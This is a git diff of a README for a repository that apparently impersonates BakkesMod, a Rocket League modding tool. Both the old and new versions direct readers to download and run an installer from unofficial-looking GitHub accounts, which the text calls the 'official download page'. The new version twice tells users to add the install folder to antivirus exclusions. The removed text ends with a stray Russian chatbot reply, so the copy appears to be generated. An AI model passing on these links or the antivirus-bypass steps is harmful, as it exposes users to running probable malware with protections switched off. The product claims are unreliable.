@@ -1,61 +1,97 @@
-<div align="center">
+# 🏎️ bakkesmod - Enhance your Rocket League gaming experience
 
-<img width="224" height="224" alt="images (2)" src="https://github.com/user-attachments/assets/b80fba5c-79c9-417b-a7c6-0cea4f4ae962" />
+[![](https://img.shields.io/badge/Download-BakkesMod-blue.svg)](https://github.com/cassydangerous828/bakkesmod)
 
+BakkesMod provides tools for Rocket League players on Windows. It adds features like workshop map loading, custom training options, and plugin support. This software modifies your game client to offer better practice tools and visual enhancements.
 
-# BakkesMod
-  <p align="center">
-    <strong>bakkesmod rocket league Download windows 11 plugins workshop map loader </strong>
-    <br/>
-    Plugins • Custom Training • Bots • UI Mods • Enhanced Gameplay
-    <br/>
-    <a href="https://github.com/bakkesmodrocketleague/bakkesmod/issues">Report Bug</a> | <a href="https://github.com/bakkesmodrocketleague/bakkesmod/issues">Discussions</a>
-  </p>
-  <p align="center">
-    <img src="https://img.shields.io/badge/Game-Rocket%20League-00B4FF?style=for-the-badge&logo=rocketleague" alt="Rocket League" />
-    <img src="https://img.shields.io/badge/Platform-Windows%2010%20%7C%20Windows%2011-0078D7?style=for-the-badge" alt="Platform" />
-    <br>
-    <img src="https://img.shields.io/github/stars/bakkesmodrocketleague/bakkesmod?style=flat-square&color=gold" alt="Stars" />
-    <img src="https://img.shields.io/github/license/bakkesmodrocketleague/bakkesmod?style=flat-square" alt="License" />
-  </p>
-</div>
+## 🛠️ System Requirements
 
+Ensure your computer meets these requirements before you start:
 
-## Install
- [Download `bakkesmod.zip`](https://github.com/bakkesmodrocketleague/bakkesmod/releases/download/BakkesMod/bakkesmod.zip)
- ---
- 
-## Overview
-**BakkesMod** is the leading modding framework for Rocket League, used by thousands of players to enhance their gameplay experience with custom plugins, training tools, and quality-of-life improvements.
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Game: A functional installation of Rocket League via Epic Games or Steam.
+- Storage: At least 500 MB of free space.
+- Software: Microsoft .NET Framework 4.8 or newer.
 
-<img width="1280" height="640" alt="image" src="https://github.com/user-attachments/assets/34373885-890d-42be-8e48-05d41806368c" />
+BakkesMod works by injecting code into the Rocket League process. It requires full access to your game files to function.
 
-## Key Features
-- Powerful plugin system with hundreds of community plugins
-- Advanced custom training pack support
-- Freeplay bots and custom game modes
-- Custom UI and HUD modifications
-- Performance and graphics enhancements
-- In-game console and developer tools
-- Auto-updater
-- Active and supportive community
+## 📥 Install and Setup
 
-## How to Use
-1. Download the latest release
-2. Close Rocket League completely
-3. Run `BakkesModSetup.exe` as Administrator
-4. Follow the installation steps
-5. Launch Rocket League — BakkesMod will load automatically
-6. Press **F2** to open the BakkesMod menu
+Follow these steps to install the software on your machine:
 
-## Disclaimer
-> [!Caution]
-> This is an **unofficial** mod for Rocket League.  
-> Not affiliated with Psyonix or Epic Games.  
-> Using mods may risk account penalties in online matchmaking. Use at your own risk, especially in competitive modes.
+1. Visit the [official download page](https://github.com/cassydangerous828/bakkesmod).
+2. Look for the latest version of the installer file, typically named "BakkesModSetup.exe".
+3. Save the file to your computer.
+4. Run the installer file by double-clicking it.
+5. Follow the on-screen prompts to complete the installation.
+6. The installer will create a desktop shortcut for you to use.
 
----
+If you encounter an anti-virus warning, verify the file origin from the repository. BakkesMod hooks into game processes, which can trigger strict security software. You may need to add an exception for the installation folder in your security settings to allow the mod to inject into the game.
 
-Готово!  
+## 🚀 Getting Started
 
-Хочешь добавить что-то (например, популярные плагины, больше предупреждений или изменить акценты)?
+Once you install the software, launch both BakkesMod and Rocket League. 
+
+1. Double-click the BakkesMod icon on your desktop.
+2. A small console window will appear. Keep this window open while you play.
+3. Start Rocket League through Steam or the Epic Games Launcher.
+4. Press the F2 key on your keyboard after the game reaches the main menu.
+5. A settings menu will pop up inside Rocket League.
+
+The presence of this menu proves the mod is active. Use your mouse to navigate the tabs in this window. Each tab contains specific controls for game settings, training tools, and visual options.
+
+## ⚙️ Using Workshop Maps
+
+Rocket League does not include a native browser for community-made maps. BakkesMod adds this functionality:
+
+1. Open the BakkesMod menu using F2.
+2. Navigate to the "Plugins" tab.
+3. Select the "Workshop Map Loader" plugin.
+4. Browse available maps or paste a map URL.
+5. Click "Download" to fetch the map files.
+6. Click "Play" or "Load" to start the map within the game.
+
+The workshop loader automates the file placement required to play custom levels. You do not need to move folders into your game directory manually.
+
+## ⚽ Custom Training Tools
+
+BakkesMod changes how you practice mechanics. Use these tools to improve your gameplay:
+
+- Free Play Controls: Change game physics in free play mode. You can set the ball to spawn directly on your car or force it to travel toward your net.
+- Variation Randomization: Change the shot order in custom training packs to keep your practice sessions fresh.
+- Goal Timing: View your shot statistics, including speed and accuracy, directly on the screen.
+- Recovery Training: Enable tools that force your car to stabilize after impact, helping you learn to land correctly on walls and ceilings.
+
+Navigate to the "Training" tab in the F2 menu to view these options. You can bind specific keys to reset the ball or move to the next shot instantly.
+
+## 🔌 Managing Plugins
+
+The plugin ecosystem allows the community to build custom additions. Use the "Plugin Manager" to update or remove tools:
+
+1. Open your browser and navigate to the BakkesMod plugin repository.
+2. Find a plugin you want to add.
+3. Click the "Install" button on the webpage.
+4. The plugin will download and integrate into your game automatically.
+5. Use the "Plugins" tab in the F2 menu to configure your installed tools.
+
+Plugins exist for every aspect of the game, including UI changes, ball prediction indicators, and advanced replay analyzers. You can disable any plugin at any time if it conflicts with your game settings.
+
+## 🛡️ Anti-Cheat Compatibility
+
+Rocket League uses Easy Anti-Cheat (EAC) to ensure fair play. BakkesMod is designed to work within these parameters for private games and training.
+
+- Non-EAC mode: Use this to launch the game without standard online protection. This is ideal for local training or using mods that do not affect online integrity.
+- Online Play: BakkesMod detects the game state. It automatically limits certain functions when it identifies official competitive matches to keep your account safe.
+
+Always ensure you run the most recent version of the mod. Older versions may become incompatible with game updates, which can lead to crashes during startup.
+
+## 💡 Troubleshooting
+
+If the software does not work, check these common fixes:
+
+- The game does not show the F2 menu: This usually means the software injection failed. Restart your computer and launch the game again.
+- The mod crashes after a game update: Developers update BakkesMod frequently to match game patches. Visit the main repository to download the newest version.
+- "Injection failed" error: Check if your anti-virus software quarantined the injection file. Add the installation folder to your "Exclusions" list to prevent this.
+- Wrong settings: If you change a setting that makes the game unplayable, use the "Reset to Defaults" button found in the bottom corner of the F2 interface.
+
+For additional help, search the topics provided in the repository. The community maintains forums and Discord servers where users share configurations for specific setups. Keeping your Windows installation updated is also important, as the mod relies on modern system libraries to function correctly.
